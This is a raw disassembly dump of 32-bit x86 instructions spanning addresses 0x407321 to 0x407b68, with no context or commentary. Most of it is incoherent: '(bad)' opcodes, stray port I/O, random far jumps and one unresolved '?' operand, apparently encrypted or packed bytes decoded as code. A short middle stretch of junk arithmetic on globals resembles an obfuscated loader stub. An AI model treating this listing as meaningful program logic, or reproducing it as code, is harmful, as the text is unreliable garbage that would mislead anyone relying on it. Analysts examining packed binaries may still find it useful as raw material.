  407321:	mov    bh,0xef
  407323:	out    dx,eax
  407324:	pop    ebp
  407325:	mov    bl,0x49
  407327:	les    ebx,FWORD PTR [eax+edx*2]
  40732a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40732b:	xchg   BYTE PTR [ecx-0x69],al
  40732e:	lea    ebx,[esi]
  407330:	pop    edi
  407331:	shr    BYTE PTR [esp+ebp*2+0x193c98ce],0xa5
  407339:	push   ebp
  40733a:	mov    WORD PTR [eax+0x11a92735],gs
  407340:	xchg   dl,al
  407342:	or     ecx,DWORD PTR [ebx+ebp*2-0x6e0a83f7]
  407349:	retf   
  40734a:	fs or  eax,0xe47ba234
  407350:	scas   eax,DWORD PTR es:[edi]
  407351:	leave  
  407352:	repnz mov ebx,0x82eec5d2
  407358:	jae    0x407313
  40735a:	push   0x2eaae6f2
  40735f:	sub    BYTE PTR [ebx],ah
  407361:	sbb    al,0xf6
  407363:	pop    ds
  407364:	lods   eax,DWORD PTR ds:[esi]
  407365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407366:	(bad)  
  407367:	rcl    DWORD PTR [ebx-0x436f69b9],1
  40736d:	stos   BYTE PTR es:[edi],al
  40736e:	jno    0x407393
  407370:	inc    ebp
  407371:	imul   ebp,DWORD PTR [ecx-0x53],0xecee62c2
  407378:	(bad)  
  407379:	mov    eax,0x67ce0baf
  40737e:	nop
  40737f:	jb     0x407357
  407381:	stos   BYTE PTR es:[edi],al
  407382:	sbb    eax,0x936ae289
  407387:	sbb    eax,0xeaed432
  40738c:	xchg   ecx,eax
  40738d:	out    0x93,eax
  40738f:	add    al,0xa6
  407391:	sbb    DWORD PTR [esi+0x40],ecx
  407394:	sub    eax,0xe8f418ab
  407399:	add    al,0xab
  40739b:	and    ecx,DWORD PTR [esi-0x2a]
  40739e:	out    dx,al
  40739f:	loop   0x4073ad
  4073a1:	jae    0x40740d
  4073a3:	ins    DWORD PTR es:[edi],dx
  4073a4:	pop    ebp
  4073a5:	nop
  4073a6:	ins    DWORD PTR es:[edi],dx
  4073a7:	pop    ebp
  4073a8:	cmp    DWORD PTR [ebp+0x20719db1],eax
  4073ae:	xchg   DWORD PTR [ebx+edi*8-0x45],edi
  4073b2:	add    cl,BYTE PTR [eax+0x69054bc1]
  4073b8:	cld    
  4073b9:	les    eax,FWORD PTR [ebx+0x14fd9194]
  4073bf:	fidiv  WORD PTR [edi+0x17a71e18]
  4073c5:	test   DWORD PTR [edi+0x75],0x788732a4
  4073cc:	push   es
  4073cd:	std    
  4073ce:	mov    esi,0xf49992a3
  4073d3:	loop   0x40736b
  4073d5:	adc    al,0x14
  4073d7:	(bad)  [ebp*1-0x1807d57d]
  4073de:	xchg   ebx,eax
  4073df:	mov    bh,0x9c
  4073e1:	mov    dl,0xc0
  4073e3:	dec    ebp
  4073e4:	ror    BYTE PTR [eax],1
  4073e6:	int    0xe
  4073e8:	loopne 0x407445
  4073ea:	fdecstp 
  4073ec:	jl     0x4073e5
  4073ee:	sti    
  4073ef:	mov    edx,0xdf0863a6
  4073f4:	or     ecx,esi
  4073f6:	mov    al,ds:0xdc026258
  4073fb:	xor    BYTE PTR [eax],0xd6
  4073fe:	xor    DWORD PTR [esi*8+0x25c54024],edi
  407405:	ret    
  407406:	push   edi
  407407:	sar    edx,cl
  407409:	(bad)  
  40740a:	push   ds
  40740b:	aaa    
  40740c:	jo     0x407489
  40740e:	mov    DWORD PTR [edi+0x37],edi
  407411:	not    BYTE PTR [eax]
  407413:	mov    edx,0xbbf3eef5
  407418:	xchg   edi,eax
  407419:	call   0x8f0c4b90
  40741e:	in     al,dx
  40741f:	dec    edi
  407420:	call   0xdca04d2b
  407425:	push   ecx
  407426:	mov    bl,0xfc
  407428:	mov    bh,0x4d
  40742a:	jbe    0x4073b7
  40742c:	cmp    dl,BYTE PTR [ebx]
  40742e:	dec    esp
  40742f:	test   eax,0xcf8e80c1
  407434:	dec    esp
  407435:	xor    DWORD PTR [edx-0x5c4e7f27],esi
  40743b:	inc    edx
  40743c:	ja     0x40742a
  40743e:	js     0x407490
  407440:	push   cs
  407441:	jp     0x407411
  407443:	add    BYTE PTR es:[eax+ebx*2],ah
  407447:	push   cs
  407448:	push   eax
  407449:	ins    BYTE PTR es:[edi],dx
  40744a:	mov    dh,0xf8
  40744c:	mov    ecx,0xcdb91a95
  407451:	or     al,0xf2
  407453:	std    
  407454:	lods   eax,DWORD PTR ds:[esi]
  407455:	xor    eax,0xedbc3648
  40745a:	lods   eax,DWORD PTR ds:[esi]
  40745b:	push   eax
  40745c:	hlt    
  40745d:	fsub   DWORD PTR [eax-0x2e00c029]
  407463:	lods   eax,DWORD PTR ds:[esi]
  407464:	push   edi
  407465:	mov    esp,0xf3f05d67
  40746a:	xchg   DWORD PTR [ecx+0x6e6b996e],esp
  407470:	loopne 0x4074b2
  407472:	(bad)  
  407473:	pop    ds
  407474:	pop    ebx
  407475:	cmp    eax,DWORD PTR ds:0xc9cbf66d
  40747b:	xchg   ecx,eax
  40747c:	out    0x6c,eax
  40747e:	popa   
  40747f:	loop   0x4074b2
  407481:	dec    esi
  407482:	mov    bl,0xac
  407484:	or     bl,dl
  407486:	aaa    
  407487:	and    DWORD PTR [ebp+0x66],ecx
  40748a:	mov    eax,ds:0x1430cff5
  40748f:	push   0x7a10a9bf
  407494:	lods   al,BYTE PTR ds:[esi]
  407495:	jno    0x40747e
  407497:	jb     0x40746b
  407499:	mov    esi,0x8b6b812c
  40749e:	jl     0x407449
  4074a0:	mov    eax,ds:0xe98058b9
  4074a5:	call   0xc626:0x568
  4074ab:	dec    edi
  4074ac:	adc    ebx,edx
  4074ae:	jg     0x407504
  4074b0:	retf   0xe14f
  4074b3:	out    dx,al
  4074b4:	sahf   
  4074b5:	(bad)  
  4074b6:	aas    
  4074b7:	and    al,0x61
  4074b9:	inc    ebp
  4074ba:	lods   al,BYTE PTR ds:[esi]
  4074bb:	dec    ecx
  4074bc:	xor    eax,0x40c2a071
  4074c1:	je     0x4074d2
  4074c3:	ret    
  4074c4:	sub    al,0x6d
  4074c6:	jge    0x40745a
  4074c8:	sub    al,bl
  4074ca:	call   0x9e37:0x22e7525d
  4074d1:	out    0xe5,eax
  4074d3:	pop    esi
  4074d4:	push   es
  4074d5:	sub    esp,edi
  4074d7:	jg     0x4074e5
  4074d9:	lock pushf 
  4074db:	push   edi
  4074dc:	and    al,0x7b
  4074de:	ret    0xdb7a
  4074e1:	xor    DWORD PTR [ebx+0x77],edx
  4074e4:	jmp    0x407526
  4074e6:	ins    BYTE PTR es:[edi],dx
  4074e7:	push   edi
  4074e8:	pop    edi
  4074e9:	add    DWORD PTR [eax+0x20fa6f20],esp
  4074ef:	(bad)  
  4074f0:	mov    BYTE PTR [ecx-0x561eac31],cl
  4074f6:	paddb  mm2,QWORD PTR [edx+0x37b9fe8]
  4074fd:	pop    ss
  4074fe:	outs   dx,BYTE PTR ds:[esi]
  4074ff:	ficom  WORD PTR [ecx+eiz*2]
  407502:	mov    BYTE PTR [edx-0x23],dh
  407505:	xor    edi,DWORD PTR [ecx]
  407507:	scas   eax,DWORD PTR es:[edi]
  407508:	pop    ds
  407509:	ret    0x81d4
  40750c:	shr    BYTE PTR [eax+0x5ecfd25],1
  407512:	pop    esp
  407513:	in     eax,0xdc
  407515:	mov    ch,0x9
  407517:	and    esi,DWORD PTR [eax]
  407519:	push   ebx
  40751a:	jmp    0x407525
  40751c:	data16 sub al,0x23
  40751f:	inc    esi
  407520:	pop    esp
  407521:	std    
  407522:	inc    esi
  407523:	scas   eax,DWORD PTR es:[edi]
  407524:	or     dl,BYTE PTR [esi+0x61]
  407527:	gs mov esi,0x97b42ff2
  40752d:	mov    ebp,0x95f87a3
  407532:	test   al,0xe8
  407534:	cmp    ebp,DWORD PTR [esi-0x23ec3d3e]
  40753a:	xchg   esp,eax
  40753b:	and    BYTE PTR [ebx-0x33346769],ah
  407541:	pop    eax
  407542:	push   0x6e15d5d5
  407547:	stc    
  407548:	pop    eax
  407549:	in     eax,0xb1
  40754b:	daa    
  40754c:	add    al,0x1b
  40754e:	jmp    0xad64:0x7f78a0b5
  407555:	and    eax,0x279e2cd7
  40755a:	stos   BYTE PTR es:[edi],al
  40755b:	daa    
  40755c:	mov    esp,0xfaf59527
  407561:	jne    0x407519
  407563:	aas    
  407564:	mov    cl,dh
  407566:	jmp    0x40756e
  407568:	mov    esi,0xbf24fd6e
  40756d:	mov    esi,0x9c21f6b9
  407572:	cs jecxz 0x407589
  407575:	adc    eax,0x57f9a344
  40757a:	or     al,0x82
  40757c:	iret   
  40757d:	(bad)  
  40757e:	fsub   st(5),st
  407580:	loop   0x40753e
  407582:	cmp    dl,BYTE PTR [ecx]
  407584:	and    eax,0xdb79f526
  407589:	dec    esi
  40758a:	inc    eax
  40758b:	mov    DWORD PTR [esi+ecx*1],ecx
  40758e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40758f:	sub    bh,BYTE PTR [ebx+0x4a72b102]
  407595:	sub    dh,BYTE PTR [edi-0x23]
  407598:	repz or bl,al
  40759b:	dec    edx
  40759c:	mov    ss,WORD PTR [edi]
  40759e:	mov    dl,0xe8
  4075a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075a1:	xchg   esp,eax
  4075a2:	xchg   ecx,eax
  4075a3:	bound  ebp,QWORD PTR [ebp-0x3f1f73a7]
  4075a9:	xchg   esp,eax
  4075aa:	inc    ax
  4075ac:	std    
  4075ad:	repnz push 0x52
  4075b0:	sti    
  4075b1:	sub    al,0xb0
  4075b3:	push   es
  4075b4:	cmp    eax,0x405f4bf8
  4075b9:	ins    DWORD PTR es:[edi],dx
  4075ba:	mov    BYTE PTR [edx+eax*1+0x3d],ch
  4075be:	test   eax,0x70777b5c
  4075c3:	fimul  DWORD PTR [edx+0x1a79618a]
  4075c9:	cli    
  4075ca:	ficom  WORD PTR ds:0x1c533c69
  4075d0:	fcmovnbe st,st(4)
  4075d2:	xor    cl,BYTE PTR [eax+0x15cbd2b8]
  4075d8:	loope  0x4075bc
  4075da:	xchg   esp,eax
  4075db:	fmul   st,st(0)
  4075dd:	inc    eax
  4075de:	push   ds
  4075df:	mov    DWORD PTR [esi],esp
  4075e1:	and    ch,al
  4075e3:	dec    eax
  4075e4:	add    edi,DWORD PTR [edx-0x3c629112]
  4075ea:	jb     0x407650
  4075ec:	fs xchg edx,eax
  4075ee:	ins    DWORD PTR es:[edi],dx
  4075ef:	push   0xffffffff
  4075f1:	sar    ecx,0xdb
  4075f4:	inc    edi
  4075f5:	and    esi,DWORD PTR [ecx-0x57]
  4075f8:	or     eax,0x7167b5fd
  4075fd:	clc    
  4075fe:	outs   dx,BYTE PTR ds:[esi]
  4075ff:	ss jnp 0x407667
  407602:	mov    eax,0xbe55f047
  407607:	out    0xae,al
  407609:	pop    ecx
  40760a:	jl     0x407655
  40760c:	test   BYTE PTR [esp+edi*2+0x33397d62],bl
  407613:	or     eax,0xe5dc2488
  407618:	cmp    BYTE PTR [ebx+0x2a],0xc7
  40761c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40761d:	pop    ecx
  40761e:	xchg   dl,cl
  407620:	jns    0x4075b2
  407622:	pop    DWORD PTR [ebp-0x73ef1d69]
  407628:	dec    esp
  407629:	cli    
  40762a:	icebp  
  40762b:	or     DWORD PTR [ebx],eax
  40762d:	mov    cl,BYTE PTR [ebx-0x5f]
  407630:	and    BYTE PTR [ebx+ebp*8-0x3b],dh
  407634:	inc    ebx
  407635:	sub    bh,al
  407637:	adc    edi,esp
  407639:	sub    BYTE PTR [edx-0x2d6bab74],dl
  40763f:	(bad)  
  407640:	pop    eax
  407641:	iret   
  407642:	push   0xffffffd7
  407644:	pop    esi
  407645:	xlat   BYTE PTR ds:[ebx]
  407646:	arpl   dx,bx
  407648:	mov    ds:0xcaa9a796,eax
  40764d:	ins    DWORD PTR es:[edi],dx
  40764e:	cdq    
  40764f:	lds    ebp,FWORD PTR [ebx-0x3d]
  407652:	pop    ebx
  407653:	dec    ebx
  407654:	fwait
  407655:	scas   al,BYTE PTR es:[edi]
  407656:	mov    cl,0xc9
  407658:	mov    dh,0x8b
  40765a:	pop    ebx
  40765b:	mov    esi,0x7253f175
  407660:	aaa    
  407661:	cmp    cl,BYTE PTR [edi]
  407663:	jb     0x407636
  407665:	mov    al,0x6d
  407667:	stos   BYTE PTR es:[edi],al
  407668:	fmul   DWORD PTR [ecx+0x3b7b2164]
  40766e:	mov    ?,WORD PTR [edx]
  407670:	(bad)  
  407671:	jg     0x40764e
  407673:	popf   
  407674:	push   eax
  407675:	sub    ebx,DWORD PTR [edi+0x2cb1a74e]
  40767b:	push   ebp
  40767c:	adc    DWORD PTR [esi],ecx
  40767e:	rol    DWORD PTR [edi+eiz*4+0x6b],1
  407682:	pusha  
  407683:	shl    BYTE PTR [edi+0x5a],0x7f
  407687:	sbb    al,0x6d
  407689:	clc    
  40768a:	mov    al,ds:0x24487671
  40768f:	xchg   esp,eax
  407690:	arpl   WORD PTR [eax-0x70],bp
  407693:	dec    ebp
  407694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407695:	sbb    edx,DWORD PTR [ebp-0x3f]
  407698:	jmp    0x4d8b:0xe44d8902
  40769f:	sbb    BYTE PTR [ecx+0x4229a62d],al
  4076a5:	add    BYTE PTR [edx+0x42],bl
  4076a8:	add    BYTE PTR [eax],al
  4076aa:	mov    edx,DWORD PTR [ebp+0x1c]
  4076ad:	or     DWORD PTR ds:0x4228da,0x210e
  4076b7:	xor    DWORD PTR [ebp-0x1c],edi
  4076ba:	or     DWORD PTR ds:0x422962,0x4229ce
  4076c4:	xor    edx,edx
  4076c6:	or     edx,DWORD PTR [ebp-0x1c]
  4076c9:	or     DWORD PTR ds:0x4228ce,0x4229c2
  4076d3:	shl    ecx,0x1e
  4076d6:	dec    DWORD PTR ds:0x4228f2
  4076dc:	add    edx,DWORD PTR [ebp-0x2c]
  4076df:	add    DWORD PTR [eax],edx
  4076e1:	sbb    eax,0x3637
  4076e6:	mov    eax,DWORD PTR [esi]
  4076e8:	sub    DWORD PTR ds:0x42292a,ebx
  4076ee:	mov    ecx,DWORD PTR [esi+0x4]
  4076f1:	movzx  edx,BYTE PTR ds:0x42290a
  4076f8:	sub    edx,DWORD PTR ds:0x42292e
  4076fe:	mov    DWORD PTR ds:0x42290a,edx
  407704:	shrd   eax,ecx,0x2
  407708:	shr    ecx,0x2
  40770b:	sub    edx,edx
  40770d:	mov    ecx,DWORD PTR [esi]
  40770f:	cmp    DWORD PTR ds:0x422956,0x0
  407716:	mov    DWORD PTR ds:0x422992,0x518b
  407720:	mov    edx,DWORD PTR ds:0x4228ee
  407726:	mov    DWORD PTR ds:0x4229b6,0x962
  407730:	jmp    0x40778a
  407735:	mov    DWORD PTR ds:0x422992,0x300f
  40773f:	mov    DWORD PTR ds:0x42296a,0xfe3
  407749:	jne    0x407770
  40774f:	push   0x0
  407751:	push   0x5aa3
  407756:	push   0x671f
  40775b:	push   DWORD PTR [ebp-0x10]
  40775e:	call   DWORD PTR ds:0x42a178
  407764:	and    DWORD PTR ds:0x42296a,ecx
  40776a:	sub    edx,0x694d
  407770:	inc    edx
  407771:	adc    DWORD PTR ds:0x4228be,0x1a32
  40777b:	dec    edx
  40777c:	mov    edx,DWORD PTR ds:0x4229fe
  407782:	mov    edx,DWORD PTR [edx]
  407784:	xor    DWORD PTR ds:0x422922,edx
  40778a:	mov    edx,DWORD PTR [esi+0x4]
  40778d:	xor    eax,edi
  40778f:	shl    ecx,0x1e
  407792:	xor    edx,edx
  407794:	or     edx,eax
  407796:	xor    eax,eax
  407798:	add    eax,DWORD PTR ds:0x4229c2
  40779e:	adc    eax,DWORD PTR ds:0x42298e
  4077a4:	mov    ds:0x4229c2,eax
  4077a9:	jmp    0x407d33
  4077ae:	jle    0x407760
  4077b0:	fucomp st(4)
  4077b2:	sbb    DWORD PTR [eax-0x7c58e782],esp
  4077b8:	test   BYTE PTR [edx-0x514947ce],dh
  4077be:	mul    DWORD PTR [ebx+0x16]
  4077c1:	push   ss
  4077c2:	cmp    eax,0xc9161604
  4077c7:	int    0xcf
  4077c9:	sub    eax,0xb9f7e269
  4077ce:	xchg   DWORD PTR ds:0xe1ffbb3e,edx
  4077d4:	pop    esp
  4077d5:	call   0x7545a252
  4077da:	leave  
  4077db:	mov    edi,0xdaf57fbe
  4077e0:	iret   
  4077e1:	cwde   
  4077e2:	in     eax,dx
  4077e3:	cmc    
  4077e4:	out    dx,al
  4077e5:	pop    ecx
  4077e6:	adc    al,0x80
  4077e8:	mov    ah,0x68
  4077ea:	(bad)  
  4077eb:	adc    eax,0xac39c02c
  4077f0:	inc    edx
  4077f1:	cmp    dl,BYTE PTR [ecx]
  4077f3:	ins    BYTE PTR es:[edi],dx
  4077f4:	in     eax,dx
  4077f5:	(bad)  
  4077f6:	adc    dh,BYTE PTR [ebx]
  4077f8:	out    0xc5,eax
  4077fa:	mov    ebx,0x31e941cb
  4077ff:	bound  esp,QWORD PTR [edi+0x8b1ad41]
  407805:	aas    
  407806:	push   edi
  407807:	mul    DWORD PTR [eax+0x497c441b]
  40780d:	lods   al,BYTE PTR ds:[esi]
  40780e:	mov    gs,WORD PTR [edi+edx*4+0x4e4589e2]
  407815:	jo     0x40788e
  407817:	mov    DWORD PTR [ebx+ebp*2],esp
  40781a:	inc    esi
  40781b:	push   ds
  40781c:	loopne 0x407888
  40781e:	pop    ebx
  40781f:	jmp    0x6e72:0x2346acbb
  407826:	inc    esp
  407827:	lahf   
  407828:	or     DWORD PTR [eax],esp
  40782a:	xchg   ecx,eax
  40782b:	ja     0x40781e
  40782d:	or     edi,edx
  40782f:	sbb    al,0xa1
  407831:	xchg   ebx,eax
  407832:	jnp    0x4077cb
  407834:	lods   al,BYTE PTR ds:[esi]
  407835:	cmp    DWORD PTR [ecx+0x40429115],eax
  40783b:	mov    dl,0xcf
  40783d:	ins    BYTE PTR es:[edi],dx
  40783e:	add    DWORD PTR [eax-0xa],edi
  407841:	jecxz  0x4077f6
  407843:	push   edi
  407844:	xchg   ebx,eax
  407845:	mov    esi,0xf55498f6
  40784a:	(bad)  
  40784b:	test   eax,0xc3ebc012
  407850:	mov    al,ds:0x790fc913
  407855:	add    DWORD PTR [edx-0x3689ba15],edi
  40785b:	xlat   BYTE PTR ds:[ebx]
  40785c:	repnz mov eax,0x8c0c318c
  407862:	push   esp
  407863:	cmp    cl,dl
  407865:	inc    edi
  407866:	adc    al,0xd9
  407868:	sbb    dh,BYTE PTR [ecx+0xfc7f9a]
  40786e:	mov    DWORD PTR [ebp-0xf],ebx
  407871:	cmp    ecx,ecx
  407873:	int3   
  407874:	mov    esp,0x2bf53fee
  407879:	inc    esp
  40787a:	cld    
  40787b:	imul   ebp,DWORD PTR [edx-0x72990fd0],0xa77666b9
  407885:	inc    ebp
  407886:	push   0x3c
  407888:	jl     0x4078a1
  40788a:	ins    DWORD PTR es:[edi],dx
  40788b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40788c:	or     al,0x4c
  40788e:	or     eax,0x23b2b040
  407893:	xchg   esi,eax
  407894:	ret    
  407895:	xchg   esi,eax
  407896:	clc    
  407897:	and    al,0xa9
  407899:	pop    edx
  40789a:	jp     0x262d03f8
  4078a0:	mov    ebx,0xf4bff28a
  4078a5:	mov    edi,0x72744c0c
  4078aa:	push   ebx
  4078ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078ac:	js     0x407862
  4078ae:	and    BYTE PTR [ecx],0xd4
  4078b1:	icebp  
  4078b2:	mov    edi,0x4211721f
  4078b7:	aaa    
  4078b8:	pop    ebp
  4078b9:	mov    ds:0x6068cbc2,al
  4078be:	push   esi
  4078bf:	sub    bl,BYTE PTR [edx+0x13]
  4078c2:	in     eax,0xa3
  4078c4:	and    BYTE PTR [ebp+0x3fd0cbb],0x9d
  4078cb:	mov    dl,0x3b
  4078cd:	adc    DWORD PTR [edx+0x7fd8ab67],esi
  4078d3:	and    eax,0xa536fce7
  4078d8:	aas    
  4078d9:	xchg   ebx,eax
  4078da:	jo     0x40787b
  4078dc:	or     dl,dh
  4078de:	les    edx,FWORD PTR ds:0xa20d244b
  4078e4:	add    BYTE PTR [edx+0x2c],bh
  4078e7:	int    0x9
  4078e9:	sbb    eax,0xc745f3d5
  4078ee:	out    0x3b,eax
  4078f0:	push   0xffffff94
  4078f2:	pusha  
  4078f3:	mov    edx,0x5690d9c1
  4078f8:	loop   0x40789f
  4078fa:	and    eax,eax
  4078fc:	cwde   
  4078fd:	xor    ch,BYTE PTR [ebp-0x35]
  407900:	or     dl,BYTE PTR [ecx]
  407902:	out    0xd4,eax
  407904:	push   ds
  407905:	cmp    cl,BYTE PTR [ecx*8+0x1fcce8a4]
  40790c:	ror    DWORD PTR [eax],0x5b
  40790f:	sti    
  407910:	aas    
  407911:	xchg   BYTE PTR [eax],bh
  407913:	sahf   
  407914:	pop    esp
  407915:	js     0x407920
  407917:	add    eax,0xd4b507f4
  40791c:	js     0x4078fd
  40791e:	xor    DWORD PTR [esi],0x5ffb3366
  407924:	dec    esp
  407925:	sbb    al,0x90
  407927:	in     al,0x49
  407929:	mov    edx,0x7747ec4d
  40792e:	mov    dl,0xf9
  407930:	mov    ebp,0x47ef96aa
  407935:	pop    esp
  407936:	stc    
  407937:	or     BYTE PTR [ecx-0x59],bl
  40793a:	pushf  
  40793b:	or     edi,edi
  40793d:	fistp  DWORD PTR [eax+0x64681f88]
  407943:	sahf   
  407944:	cld    
  407945:	rol    DWORD PTR [edx+edx*1],1
  407948:	xchg   eax,ebp
  40794a:	lahf   
  40794b:	inc    ebx
  40794c:	call   0xb2f2:0x232a7a72
  407953:	inc    esp
  407954:	mov    edi,0x623dd989
  407959:	test   al,0x91
  40795b:	popf   
  40795c:	in     eax,dx
  40795d:	mov    cl,0xe2
  40795f:	xor    esi,DWORD PTR [edx-0x6b504dd1]
  407965:	push   esi
  407966:	xor    al,ah
  407968:	loope  0x40796d
  40796a:	mov    ds:0x7caa2206,eax
  40796f:	es fs push edx
  407972:	stc    
  407973:	xchg   ebx,eax
  407974:	cld    
  407975:	ja     0x4079bd
  407977:	jge    0x407967
  407979:	jmp    0x7a9bc31b
  40797e:	iret   
  40797f:	and    al,0x5a
  407981:	ret    
  407982:	in     al,0xe
  407984:	mov    dh,0xdb
  407986:	mov    DWORD PTR [edx],esi
  407988:	stc    
  407989:	cli    
  40798a:	adc    cl,BYTE PTR [ecx-0x1f5b644]
  407990:	out    0xe0,al
  407992:	test   BYTE PTR [ebp-0x2e68f660],bl
  407998:	mov    eax,ds:0x7416f058
  40799d:	inc    ebp
  40799e:	sub    dl,BYTE PTR [edx+0x65b36c4e]
  4079a4:	jl     0x4079fc
  4079a6:	clc    
  4079a7:	mov    esp,DWORD PTR [esi+0x79]
  4079aa:	xor    BYTE PTR [ebx-0x6e71a7ff],ch
  4079b0:	pop    ebp
  4079b1:	xor    esi,edi
  4079b3:	push   edx
  4079b4:	in     eax,0x1d
  4079b6:	mov    ah,0xd4
  4079b8:	js     0x4079c7
  4079ba:	out    dx,al
  4079bb:	mov    bh,0xa0
  4079bd:	fisttp DWORD PTR [esi+eax*1]
  4079c0:	out    0x80,al
  4079c2:	lea    edi,[ecx]
  4079c4:	mov    WORD PTR [eax+0x37e5a1fa],ss
  4079ca:	push   ss
  4079cb:	or     dh,cl
  4079cd:	imul   ecx,DWORD PTR ss:[edx],0x88e7231c
  4079d4:	pop    esp
  4079d5:	shr    DWORD PTR ds:0xa9c501b3,0xa2
  4079dc:	stc    
  4079dd:	inc    edx
  4079de:	push   ecx
  4079df:	test   DWORD PTR [ebx+0x35],0x8bd9ba04
  4079e6:	push   0x5c05988f
  4079eb:	mov    edi,0xc891ae22
  4079f0:	(bad)  
  4079f2:	sbb    ah,BYTE PTR [esi+0x6f]
  4079f5:	jo     0x407986
  4079f7:	je     0x4079a6
  4079f9:	rcl    ebx,cl
  4079fb:	xchg   edi,eax
  4079fc:	test   DWORD PTR [esi+0x5a],esi
  4079ff:	push   0xa7e673bc
  407a04:	and    dh,bl
  407a06:	cwde   
  407a07:	add    DWORD PTR [ecx-0x65],ebp
  407a0a:	fwait
  407a0b:	and    DWORD PTR [eax+0x498c3c93],ebp
  407a11:	addr16 jmp 0x5554bf88
  407a17:	mov    esp,0xf293e600
  407a1c:	pop    ecx
  407a1d:	out    dx,eax
  407a1e:	aas    
  407a1f:	and    BYTE PTR [esi+ecx*8],cl
  407a22:	or     DWORD PTR [edi+ebx*1+0x72],ebp
  407a26:	jp     0x407a5f
  407a28:	repnz mov dh,0xae
  407a2b:	adc    dh,BYTE PTR [eax+0x58]
  407a2e:	jp     0x407a7a
  407a30:	jle    0x407a62
  407a32:	sahf   
  407a33:	cmc    
  407a34:	icebp  
  407a35:	xchg   edi,eax
  407a36:	fs xor eax,edx
  407a39:	or     cl,0x1b
  407a3c:	mov    esp,0x7ed355f4
  407a42:	imul   eax,DWORD PTR [edx],0xfc832c67
  407a48:	enter  0xb4b4,0x2d
  407a4c:	iret   
  407a4d:	cmc    
  407a4e:	lods   eax,DWORD PTR ds:[esi]
  407a4f:	or     DWORD PTR [ebp+eiz*1-0x57],edi
  407a53:	cmp    dh,BYTE PTR [esi+0x744cb8a5]
  407a59:	ja     0x407a8a
  407a5b:	js     0x407a94
  407a5d:	mov    ds:0xbfb22517,eax
  407a62:	xchg   edi,eax
  407a63:	enter  0xf512,0x6e
  407a67:	in     al,0x73
  407a69:	and    al,0xd2
  407a6b:	xor    DWORD PTR [ebx],ecx
  407a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a6e:	nop
  407a6f:	mov    ebp,esp
  407a71:	retf   0x28cf
  407a74:	mov    eax,0xdfb1ba34
  407a79:	retf   0x8282
  407a7c:	sbb    DWORD PTR [ebx],ebx
  407a7e:	and    BYTE PTR [ecx],bl
  407a80:	xor    cl,BYTE PTR [ecx]
  407a82:	mov    edx,0x1c1bbcbb
  407a87:	mov    dl,0x15
  407a89:	jne    0x407ac1
  407a8b:	data16 jae 0x407af9
  407a8e:	or     DWORD PTR [eax],0x6d0076f3
  407a94:	sti    
  407a95:	inc    esi
  407a96:	xchg   esp,eax
  407a97:	sbb    esp,DWORD PTR [ebp+0x1f]
  407a9a:	cmp    eax,0xff5803e3
  407a9f:	dec    eax
  407aa0:	(bad)  
  407aa1:	in     al,dx
  407aa2:	test   ah,ah
  407aa4:	or     ecx,ebx
  407aa6:	inc    esi
  407aa7:	mov    DWORD PTR [eax-0x41dc4124],0xe2bd4a1a
  407ab1:	jne    0x407ac3
  407ab3:	cmp    al,0x88
  407ab5:	adc    BYTE PTR [ebx+0x6c],dh
  407ab8:	test   DWORD PTR [ebx+0x3e2ea724],ebx
  407abe:	repz loopne 0x407a91
  407ac1:	fidivr WORD PTR ds:0x3a0b4837
  407ac7:	and    esi,DWORD PTR [edi]
  407ac9:	add    al,0x93
  407acb:	pop    es
  407acc:	push   0xe2d7ee7c
  407ad1:	mov    bl,0xe5
  407ad3:	xor    al,ch
  407ad5:	cmp    bl,al
  407ad7:	or     eax,0x3549cde3
  407adc:	add    al,0xae
  407ade:	sub    DWORD PTR [esp+esi*8-0x59],0xffffffdc
  407ae3:	sti    
  407ae4:	pop    ds
  407ae5:	popa   
  407ae6:	xchg   ebx,eax
  407ae7:	mov    ah,0x87
  407ae9:	dec    ebx
  407aea:	fsub   DWORD PTR [ebp+0x1da9bf44]
  407af0:	or     BYTE PTR [edx-0xf],bl
  407af3:	xchg   ecx,eax
  407af4:	mov    ch,0x31
  407af6:	inc    ebx
  407af7:	dec    edi
  407af8:	sti    
  407af9:	pop    eax
  407afa:	popa   
  407afb:	inc    ebx
  407afc:	das    
  407afd:	push   0x5f
  407aff:	arpl   WORD PTR [esi],sp
  407b01:	lds    edi,FWORD PTR cs:[edx]
  407b04:	pop    ecx
  407b05:	cmp    eax,esi
  407b07:	imul   edi,DWORD PTR [edx-0x6f86e99e],0xffffffb9
  407b0e:	pop    edx
  407b0f:	and    ch,BYTE PTR [ebx]
  407b11:	ret    
  407b12:	xor    al,0x30
  407b14:	fwait
  407b15:	and    DWORD PTR [edi],ebp
  407b17:	outs   dx,BYTE PTR ds:[esi]
  407b18:	pop    edi
  407b19:	xlat   BYTE PTR ds:[ebx]
  407b1a:	jmp    0x407b35
  407b1c:	out    0x7,al
  407b1e:	ret    0xcc63
  407b21:	mov    eax,fs
  407b23:	or     dh,BYTE PTR [ebp+0x2b]
  407b26:	and    eax,0x1dc275f5
  407b2b:	dec    edx
  407b2c:	xchg   esi,eax
  407b2d:	push   edi
  407b2e:	xchg   ecx,eax
  407b2f:	cmp    ah,BYTE PTR [ecx]
  407b31:	or     eax,0x1755aeb2
  407b36:	loopne 0x407ac5
  407b38:	cld    
  407b39:	cmp    BYTE PTR ds:0x97a4eb88,cl
  407b3f:	cmc    
  407b40:	cmp    dh,ch
  407b42:	out    dx,al
  407b43:	jb     0x407b68
  407b45:	shr    DWORD PTR [edi+0x4527ef4d],cl
  407b4b:	sbb    bl,dl
  407b4d:	hlt    
  407b4e:	ror    ebx,0xbb
  407b51:	fwait
  407b52:	fwait
  407b53:	cmp    dh,ch
  407b55:	and    cl,BYTE PTR [ecx]
  407b57:	xchg   bx,ax
  407b59:	cmp    ebp,ecx
  407b5b:	sbb    dh,BYTE PTR [esi]
  407b5d:	mov    dl,0x37
  407b5f:	mov    cl,0x84
  407b61:	in     eax,0xa0
  407b63:	jno    0x407b39
  407b65:	push   esp
  407b66:	mov    ch,0xda
  407b68:	push   0x64
